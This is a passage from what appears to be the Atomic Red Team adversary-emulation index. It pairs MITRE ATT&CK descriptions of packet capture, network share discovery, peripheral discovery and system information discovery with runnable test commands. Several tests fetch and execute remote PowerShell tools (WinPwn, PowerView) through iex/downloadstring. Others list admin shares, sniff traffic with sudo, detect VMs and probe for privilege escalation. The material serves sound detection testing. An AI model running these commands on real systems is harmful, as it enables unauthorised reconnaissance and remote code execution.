      description: "Select Desired ports for packet capture \nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/"
      supported_platforms:
      - windows
      executor:
        command: 'pktmon.exe filter add -p 445

          '
        cleanup_command: pktmon filter remove
        name: command_prompt
        elevation_required: true
    - name: Packet Capture macOS using /dev/bpfN with sudo
      auto_generated_guid: e6fe5095-545d-4c8b-a0ae-e863914be3aa
      description: 'Opens a /dev/bpf file (O_RDONLY) and captures packets for a few
        seconds.

        '
      supported_platforms:
      - macos
      input_arguments:
        ifname:
          description: Specify interface to perform PCAP on.
          type: string
          default: en0
        csource_path:
          description: Path to C program source
          type: string
          default: PathToAtomicsFolder/T1040/src/macos_pcapdemo.c
        program_path:
          description: Path to compiled C program
          type: string
          default: "/tmp/t1040_macos_pcapdemo"
      dependency_executor_name: bash
      dependencies:
      - description: 'compile C program

          '
        prereq_command: 'exit 1

          '
        get_prereq_command: 'cc #{csource_path} -o #{program_path}

          '
      executor:
        command: 'sudo #{program_path} -i #{ifname} -t 3

          '
        cleanup_command: 'rm -f #{program_path}

          '
        name: bash
        elevation_required: true
    - name: Filtered Packet Capture macOS using /dev/bpfN with sudo
      auto_generated_guid: e2480aee-23f3-4f34-80ce-de221e27cd19
      description: 'Opens a /dev/bpf file (O_RDONLY), sets BPF filter for ''udp''
        and captures packets for a few seconds.

        '
      supported_platforms:
      - macos
      input_arguments:
        ifname:
          description: Specify interface to perform PCAP on.
          type: string
          default: en0
        csource_path:
          description: Path to C program source
          type: string
          default: PathToAtomicsFolder/T1040/src/macos_pcapdemo.c
        program_path:
          description: Path to compiled C program
          type: string
          default: "/tmp/t1040_macos_pcapdemo"
      dependency_executor_name: bash
      dependencies:
      - description: 'compile C program

          '
        prereq_command: 'exit 1

          '
        get_prereq_command: 'cc #{csource_path} -o #{program_path}

          '
      executor:
        command: 'sudo #{program_path} -f -i #{ifname} -t 3

          '
        cleanup_command: 'rm -f #{program_path}

          '
        name: bash
        elevation_required: true
    - name: Packet Capture Linux socket AF_PACKET,SOCK_RAW with sudo
      auto_generated_guid: 10c710c9-9104-4d5f-8829-5b65391e2a29
      description: 'Captures packets with domain=AF_PACKET, type=SOCK_RAW for a few
        seconds.

        '
      supported_platforms:
      - linux
      input_arguments:
        csource_path:
          description: Path to C program source
          type: string
          default: PathToAtomicsFolder/T1040/src/linux_pcapdemo.c
        program_path:
          description: Path to compiled C program
          type: string
          default: "/tmp/t1040_linux_pcapdemo"
      dependency_executor_name: bash
      dependencies:
      - description: 'compile C program

          '
        prereq_command: 'if [ -f "#{program_path}" ]; then exit 0; else exit 1; fi

          '
        get_prereq_command: 'cc #{csource_path} -o #{program_path}

          '
      executor:
        command: 'sudo #{program_path} -a -t 3

          '
        cleanup_command: 'rm -f #{program_path}

          '
        name: bash
        elevation_required: true
    - name: Packet Capture Linux socket AF_INET,SOCK_RAW,TCP with sudo
      auto_generated_guid: 7a0895f0-84c1-4adf-8491-a21510b1d4c1
      description: 'Captures packets with domain=AF_INET,type=SOCK_RAW,protocol=TCP
        for a few seconds.

        '
      supported_platforms:
      - linux
      input_arguments:
        csource_path:
          description: Path to C program source
          type: string
          default: PathToAtomicsFolder/T1040/src/linux_pcapdemo.c
        program_path:
          description: Path to compiled C program
          type: string
          default: "/tmp/t1040_linux_pcapdemo"
      dependency_executor_name: bash
      dependencies:
      - description: 'compile C program

          '
        prereq_command: 'if [ -f "#{program_path}" ]; then exit 0; else exit 1; fi

          '
        get_prereq_command: 'cc #{csource_path} -o #{program_path}

          '
      executor:
        command: 'sudo #{program_path} -4 -p 6 -t 3

          '
        cleanup_command: 'rm -f #{program_path}

          '
        name: bash
        elevation_required: true
    - name: Packet Capture Linux socket AF_INET,SOCK_PACKET,UDP with sudo
      auto_generated_guid: 515575ab-d213-42b1-aa64-ef6a2dd4641b
      description: |
        Captures packets with domain=AF_INET,type=SOCK_PACKET,protocol=UDP for a few seconds.
        SOCK_PACKET is "obsolete" according to the man page, but still works on Ubuntu 20.04
      supported_platforms:
      - linux
      input_arguments:
        csource_path:
          description: Path to C program source
          type: string
          default: PathToAtomicsFolder/T1040/src/linux_pcapdemo.c
        program_path:
          description: Path to compiled C program
          type: string
          default: "/tmp/t1040_linux_pcapdemo"
      dependency_executor_name: bash
      dependencies:
      - description: 'compile C program

          '
        prereq_command: 'if [ -f "#{program_path}" ]; then exit 0; else exit 1; fi

          '
        get_prereq_command: 'cc #{csource_path} -o #{program_path}

          '
      executor:
        command: 'sudo #{program_path} -4 -P -p 17 -t 3

          '
        cleanup_command: 'rm -f #{program_path}

          '
        name: bash
        elevation_required: true
    - name: Packet Capture Linux socket AF_PACKET,SOCK_RAW with BPF filter for UDP
        with sudo
      auto_generated_guid: b1cbdf8b-6078-48f5-a890-11ea19d7f8e9
      description: |
        Captures packets with domain=AF_PACKET,type=SOCK_RAW for a few seconds.
        Sets a BPF filter on the socket to filter for UDP traffic.
      supported_platforms:
      - linux
      input_arguments:
        csource_path:
          description: Path to C program source
          type: string
          default: PathToAtomicsFolder/T1040/src/linux_pcapdemo.c
        program_path:
          description: Path to compiled C program
          type: string
          default: "/tmp/t1040_linux_pcapdemo"
      dependency_executor_name: bash
      dependencies:
      - description: 'compile C program

          '
        prereq_command: 'if [ -f "#{program_path}" ]; then exit 0; else exit 1; fi

          '
        get_prereq_command: 'cc #{csource_path} -o #{program_path}

          '
      executor:
        command: 'sudo #{program_path} -a -f -t 3

          '
        cleanup_command: 'rm -f #{program_path}

          '
        name: bash
        elevation_required: true
  T1135:
    technique:
      modified: '2023-03-30T21:01:46.370Z'
      name: Network Share Discovery
      description: "Adversaries may look for folders and drives shared on remote systems
        as a means of identifying sources of information to gather as a precursor
        for Collection and to identify potential systems of interest for Lateral Movement.
        Networks often contain shared network drives and folders that enable users
        to access file directories on various systems across a network. \n\nFile sharing
        over a Windows network occurs over the SMB protocol. (Citation: Wikipedia
        Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039)
        can be used to query a remote system for available shared drives using the
        <code>net view \\\\\\\\remotesystem</code> command. It can also be used to
        query shared drives on the local system using <code>net share</code>. For
        macOS, the <code>sharing -l</code> command lists all shared points used for
        smb services."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_contributors:
      - Praetorian
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

        Normal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
      x_mitre_domains:
      - enterprise-attack
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - macOS
      - Windows
      - Linux
      x_mitre_version: '3.1'
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: OS API Execution'
      - 'Process: Process Creation'
      x_mitre_permissions_required:
      - User
      type: attack-pattern
      id: attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f
      created: '2017-12-14T16:46:06.044Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1135
        external_id: T1135
      - source_name: Wikipedia Shared Resource
        description: Wikipedia. (2017, April 15). Shared resource. Retrieved June
          30, 2017.
        url: https://en.wikipedia.org/wiki/Shared_resource
      - source_name: TechNet Shared Folder
        description: Microsoft. (n.d.). Share a Folder or Drive. Retrieved June 30,
          2017.
        url: https://technet.microsoft.com/library/cc770880.aspx
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_is_subtechnique: false
      identifier: T1135
    atomic_tests:
    - name: Network Share Discovery
      auto_generated_guid: f94b5ad9-911c-4eff-9718-fd21899db4f7
      description: 'Network Share Discovery

        '
      supported_platforms:
      - macos
      input_arguments:
        computer_name:
          description: Computer name to find a mount on.
          type: string
          default: computer1
      executor:
        command: |
          df -aH
          smbutil view -g //#{computer_name}
          showmount #{computer_name}
        name: sh
    - name: Network Share Discovery - linux
      auto_generated_guid: 875805bc-9e86-4e87-be86-3a5527315cae
      description: 'Network Share Discovery using smbstatus

        '
      supported_platforms:
      - linux
      input_arguments:
        package_checker:
          description: Package checking command. Debian - dpkg -s samba
          type: string
          default: "(rpm -q samba &>/dev/null) || (dpkg -s samba | grep -q installed)"
        package_installer:
          description: Package installer command. Debian - apt install samba
          type: string
          default: "(which yum && yum -y install epel-release samba)||(which apt-get
            && DEBIAN_FRONTEND=noninteractive apt-get install -y samba)"
      dependency_executor_name: bash
      dependencies:
      - description: 'Package with smbstatus (samba) must exist on device

          '
        prereq_command: 'if #{package_checker} > /dev/null; then exit 0; else exit
          1; fi

          '
        get_prereq_command: "sudo #{package_installer} \n"
      executor:
        command: 'sudo smbstatus --shares

          '
        name: bash
        elevation_required: true
    - name: Network Share Discovery command prompt
      auto_generated_guid: 20f1097d-81c1-405c-8380-32174d493bbb
      description: |
        Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host
        Upon execution avalaible network shares will be displayed in the powershell session
      supported_platforms:
      - windows
      input_arguments:
        computer_name:
          description: Computer name to find a mount on.
          type: string
          default: localhost
      executor:
        command: 'net view \\#{computer_name}

          '
        name: command_prompt
    - name: Network Share Discovery PowerShell
      auto_generated_guid: 1b0814d1-bb24-402d-9615-1b20c50733fb
      description: |
        Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host
        Upon execution, avalaible network shares will be displayed in the powershell session
      supported_platforms:
      - windows
      executor:
        command: 'get-smbshare

          '
        name: powershell
    - name: View available share drives
      auto_generated_guid: ab39a04f-0c93-4540-9ff2-83f862c385ae
      description: View information about all of the resources that are shared on
        the local computer Upon execution, avalaible share drives will be displayed
        in the powershell session
      supported_platforms:
      - windows
      executor:
        command: 'net share

          '
        name: command_prompt
    - name: Share Discovery with PowerView
      auto_generated_guid: b1636f0a-ba82-435c-b699-0d78794d8bfd
      description: 'Enumerate Domain Shares the current user has access. Upon execution,
        progress info about each share being scanned will be displayed.

        '
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'Endpoint must be joined to domain

          '
        prereq_command: 'if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain)
          {exit 0} else {exit 1}

          '
        get_prereq_command: '"Join system to domain"

          '
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
        name: powershell
    - name: PowerView ShareFinder
      auto_generated_guid: d07e4cc1-98ae-447e-9d31-36cb430d28c4
      description: PowerView is a PowerShell tool to gain network situational awareness
        on Windows domains. ShareFinder finds (non-standard) shares on machines in
        the domain.
      supported_platforms:
      - windows
      input_arguments:
        parameters:
          description: ShareFinder parameter
          type: string
          default: "-CheckShareAccess"
      dependencies:
      - description: Invoke-ShareFinder module must exist in %TEMP% directory
        prereq_command: if (Test-Path $env:TEMP\PowerView.ps1) {exit 0} else {exit
          1}
        get_prereq_command: 'Invoke-WebRequest "https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1"
          -OutFile $env:TEMP\PowerView.ps1

          '
      executor:
        command: |
          Import-Module $env:TEMP\PowerView.ps1
          Invoke-ShareFinder #{parameters}
        name: powershell
    - name: WinPwn - shareenumeration
      auto_generated_guid: 987901d1-5b87-4558-a6d9-cffcabc638b8
      description: Network share enumeration using the shareenumeration function of
        WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          shareenumeration -noninteractive -consoleoutput
        name: powershell
    - name: Network Share Discovery via dir command
      auto_generated_guid: 13daa2cf-195a-43df-a8bd-7dd5ffb607b5
      description: |
        Network Share Discovery utilizing the dir command prompt. The computer ip variable may need to be modified to point to a different host ip
        Upon execution avalaible network shares will be displayed in the commandline session
      supported_platforms:
      - windows
      input_arguments:
        computer_ip:
          description: Computer IP to find a mount on.
          type: string
          default: 127.0.0.1
      executor:
        command: |
          dir \\#{computer_ip}\c$
          dir \\#{computer_ip}\admin$
          dir \\#{computer_ip}\IPC$
        name: command_prompt
  T1120:
    technique:
      modified: '2023-03-30T21:01:41.575Z'
      name: Peripheral Device Discovery
      description: 'Adversaries may attempt to gather information about attached peripheral
        devices and components connected to a computer system.(Citation: Peripheral
        Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices
        could include auxiliary resources that support a variety of functionalities
        such as keyboards, printers, cameras, smart card readers, or removable storage.
        The information may be used to enhance their awareness of the system and network
        environment or may be used for further actions.'
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
      x_mitre_domains:
      - enterprise-attack
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      - macOS
      - Linux
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      - 'Process: OS API Execution'
      x_mitre_permissions_required:
      - User
      - Administrator
      - SYSTEM
      type: attack-pattern
      id: attack-pattern--348f1eef-964b-4eb6-bb53-69b3dcb0c643
      created: '2017-05-31T21:31:28.471Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1120
        external_id: T1120
      - source_name: Peripheral Discovery Linux
        description: Shahriar Shovon. (2018, March). List USB Devices Linux. Retrieved
          March 11, 2022.
        url: https://linuxhint.com/list-usb-devices-linux/
      - source_name: Peripheral Discovery macOS
        description: SS64. (n.d.). system_profiler. Retrieved March 11, 2022.
        url: https://ss64.com/osx/system_profiler.html
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_is_subtechnique: false
      identifier: T1120
    atomic_tests:
    - name: Win32_PnPEntity Hardware Inventory
      auto_generated_guid: 2cb4dbf2-2dca-4597-8678-4d39d207a3a5
      description: Perform peripheral device discovery using Get-WMIObject Win32_PnPEntity
      supported_platforms:
      - windows
      executor:
        command: |-
          Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\T1120_collection.txt
          $Space,$Heading,$Break,$Data = Get-Content $env:TEMP\T1120_collection.txt
          @($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne "" } |Set-Content $env:TEMP\T1120_collection.txt
        cleanup_command: Remove-Item $env:TEMP\T1120_collection.txt -ErrorAction Ignore
        name: powershell
    - name: WinPwn - printercheck
      auto_generated_guid: cb6e76ca-861e-4a7f-be08-564caa3e6f75
      description: Search for printers / potential vulns using printercheck function
        of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          printercheck -noninteractive -consoleoutput
        name: powershell
  T1082:
    technique:
      modified: '2023-03-30T21:01:40.871Z'
      name: System Information Discovery
      description: |-
        An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

        Tools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)

        Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_contributors:
      - Maril Vernon @shewhohacks
      - Praetorian
      - Austin Clark, @c2defense
      x_mitre_deprecated: false
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to gather  detailed system information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use  commands being run by non-standard users from non-standard locations. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

        In cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      - IaaS
      - Linux
      - macOS
      - Network
      x_mitre_version: '2.5'
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Process: OS API Execution'
      - 'Command: Command Execution'
      type: attack-pattern
      id: attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1
      created: '2017-05-31T21:31:04.307Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1082
        external_id: T1082
      - source_name: Amazon Describe Instance
        description: Amazon. (n.d.). describe-instance-information. Retrieved March
          3, 2020.
        url: https://docs.aws.amazon.com/cli/latest/reference/ssm/describe-instance-information.html
      - source_name: Google Instances Resource
        description: 'Google. (n.d.). Rest Resource: instance. Retrieved March 3,
          2020.'
        url: https://cloud.google.com/compute/docs/reference/rest/v1/instances
      - source_name: Microsoft Virutal Machine API
        description: Microsoft. (2019, March 1). Virtual Machines - Get. Retrieved
          October 8, 2019.
        url: https://docs.microsoft.com/en-us/rest/api/compute/virtualmachines/get
      - source_name: 20 macOS Common Tools and Techniques
        description: Phil Stokes. (2021, February 16). 20 Common Tools & Techniques
          Used by macOS Threat Actors & Malware. Retrieved August 23, 2021.
        url: https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/
      - source_name: OSX.FairyTale
        description: Phile Stokes. (2018, September 20). On the Trail of OSX.FairyTale
          | Adware Playing at Malware. Retrieved August 24, 2021.
        url: https://www.sentinelone.com/blog/trail-osx-fairytale-adware-playing-malware/
      - source_name: US-CERT-TA18-106A
        description: US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored
          Cyber Actors Targeting Network Infrastructure Devices. Retrieved October
          19, 2020.
        url: https://www.us-cert.gov/ncas/alerts/TA18-106A
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      identifier: T1082
    atomic_tests:
    - name: System Information Discovery
      auto_generated_guid: 66703791-c902-4560-8770-42b8a91f7667
      description: 'Identify System Info. Upon execution, system info and time info
        will be displayed.

        '
      supported_platforms:
      - windows
      executor:
        command: |
          systeminfo
          reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
        name: command_prompt
    - name: System Information Discovery
      auto_generated_guid: edff98ec-0f73-4f63-9890-6b117092aff6
      description: 'Identify System Info

        '
      supported_platforms:
      - macos
      executor:
        command: |
          system_profiler
          ls -al /Applications
        name: sh
    - name: List OS Information
      auto_generated_guid: cccb070c-df86-4216-a5bc-9fb60c74e27c
      description: 'Identify System Info

        '
      supported_platforms:
      - linux
      - macos
      input_arguments:
        output_file:
          description: Output file used to store the results.
          type: path
          default: "/tmp/T1082.txt"
      executor:
        command: "uname -a >> #{output_file}\nif [ -f /etc/lsb-release ]; then cat
          /etc/lsb-release >> #{output_file}; fi\nif [ -f /etc/redhat-release ]; then
          cat /etc/redhat-release >> #{output_file}; fi   \nif [ -f /etc/issue ];
          then cat /etc/issue >> #{output_file}; fi\nuptime >> #{output_file}\ncat
          #{output_file} 2>/dev/null\n"
        cleanup_command: 'rm #{output_file} 2>/dev/null

          '
        name: sh
    - name: Linux VM Check via Hardware
      auto_generated_guid: 31dad7ad-2286-4c02-ae92-274418c85fec
      description: 'Identify virtual machine hardware. This technique is used by the
        Pupy RAT and other malware.

        '
      supported_platforms:
      - linux
      executor:
        elevation_required: true
        command: |
          if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi
          if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i "Droplet\|HVM\|VirtualBox\|VMware"; fi
          if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i "Xen\|Bochs\|QEMU"; fi
          if [ -x "$(command -v dmidecode)" ]; then sudo dmidecode | grep -i "microsoft\|vmware\|virtualbox\|quemu\|domu"; fi
          if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i "vmware\|vbox"; fi
          if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i "vmware\|vbox\|qemu\|virtual"; fi
          if [ -x "$(command -v lspci)" ]; then sudo lspci | grep -i "vmware\|virtualbox"; fi
          if [ -x "$(command -v lscpu)" ]; then sudo lscpu | grep -i "Xen\|KVM\|Microsoft"; fi
        name: bash
    - name: Linux VM Check via Kernel Modules
      auto_generated_guid: 8057d484-0fae-49a4-8302-4812c4f1e64e
      description: 'Identify virtual machine guest kernel modules. This technique
        is used by the Pupy RAT and other malware.

        '
      supported_platforms:
      - linux
      executor:
        command: |
          sudo lsmod | grep -i "vboxsf\|vboxguest"
          sudo lsmod | grep -i "vmw_baloon\|vmxnet"
          sudo lsmod | grep -i "xen-vbd\|xen-vnif"
          sudo lsmod | grep -i "virtio_pci\|virtio_net"
          sudo lsmod | grep -i "hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"
        name: bash
    - name: Hostname Discovery (Windows)
      auto_generated_guid: 85cfbf23-4a1e-4342-8792-007e004b975f
      description: 'Identify system hostname for Windows. Upon execution, the hostname
        of the device will be displayed.

        '
      supported_platforms:
      - windows
      executor:
        command: 'hostname

          '
        name: command_prompt
    - name: Hostname Discovery
      auto_generated_guid: 486e88ea-4f56-470f-9b57-3f4d73f39133
      description: 'Identify system hostname for Linux and macOS systems.

        '
      supported_platforms:
      - linux
      - macos
      executor:
        command: 'hostname

          '
        name: bash
    - name: Windows MachineGUID Discovery
      auto_generated_guid: 224b4daf-db44-404e-b6b2-f4d1f0126ef8
      description: 'Identify the Windows MachineGUID value for a system. Upon execution,
        the machine GUID will be displayed from registry.

        '
      supported_platforms:
      - windows
      executor:
        command: 'REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v
          MachineGuid

          '
        name: command_prompt
    - name: Griffon Recon
      auto_generated_guid: 69bd4abe-8759-49a6-8d21-0f15822d6370
      description: "This script emulates the reconnaissance script seen in used by
        Griffon and was modified by security researcher Kirk Sayre \nin order simply
        print the recon results to the screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).
        \ \nFor more information see also [https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon)
        and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)"
      supported_platforms:
      - windows
      input_arguments:
        vbscript:
          description: Path to sample script
          type: string
          default: PathToAtomicsFolder\T1082\src\griffon_recon.vbs
      dependency_executor_name: powershell
      dependencies:
      - description: 'Sample script file must exist on disk at specified location
          (#{vbscript})

          '
        prereq_command: 'if (Test-Path #{vbscript}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{vbscript}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1082/src/griffon_recon.vbs" -OutFile "#{vbscript}"
      executor:
        command: 'cscript #{vbscript}'
        name: powershell
        elevation_required: false
    - name: Environment variables discovery on windows
      auto_generated_guid: f400d1c0-1804-4ff8-b069-ef5ddd2adbf3
      description: 'Identify all environment variables. Upon execution, environments
        variables and your path info will be displayed.

        '
      supported_platforms:
      - windows
      executor:
        command: 'set

          '
        name: command_prompt
    - name: Environment variables discovery on macos and linux
      auto_generated_guid: fcbdd43f-f4ad-42d5-98f3-0218097e2720
      description: 'Identify all environment variables. Upon execution, environments
        variables and your path info will be displayed.

        '
      supported_platforms:
      - macos
      - linux
      executor:
        command: 'env

          '
        name: sh
    - name: Show System Integrity Protection status (MacOS)
      auto_generated_guid: 327cc050-9e99-4c8e-99b5-1d15f2fb6b96
      description: 'Read and Display System Intergrety Protection status. csrutil
        is commonly used by malware and post-exploitation tools to determine whether
        certain files and directories on the system are writable or not.

        '
      supported_platforms:
      - macos
      executor:
        command: 'csrutil status

          '
        name: sh
    - name: WinPwn - winPEAS
      auto_generated_guid: eea1d918-825e-47dd-acc2-814d6c58c0e1
      description: Discover Local Privilege Escalation possibilities using winPEAS
        function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          winPEAS -noninteractive -consoleoutput
        name: powershell
    - name: WinPwn - itm4nprivesc
      auto_generated_guid: 3d256a2f-5e57-4003-8eb6-64d91b1da7ce
      description: Discover Local Privilege Escalation possibilities using itm4nprivesc
        function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          itm4nprivesc -noninteractive -consoleoutput
        name: powershell
    - name: WinPwn - Powersploits privesc checks
      auto_generated_guid: 345cb8e4-d2de-4011-a580-619cf5a9e2d7
      description: Powersploits privesc checks using oldchecks function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          oldchecks -noninteractive -consoleoutput
        cleanup_command: |-
          rm -force -recurse .\DomainRecon -ErrorAction Ignore
          rm -force -recurse .\Exploitation -ErrorAction Ignore
          rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
          rm -force -recurse .\LocalRecon -ErrorAction Ignore
          rm -force -recurse .\Vulnerabilities -ErrorAction Ignore
        name: powershell
    - name: WinPwn - General privesc checks
      auto_generated_guid: 5b6f39a2-6ec7-4783-a5fd-2c54a55409ed
      description: General privesc checks using the otherchecks function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          otherchecks -noninteractive -consoleoutput
        name: powershell
    - name: WinPwn - GeneralRecon
      auto_generated_guid: 7804659b-fdbf-4cf6-b06a-c03e758590e8
      description: Collect general computer informations via GeneralRecon function
        of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
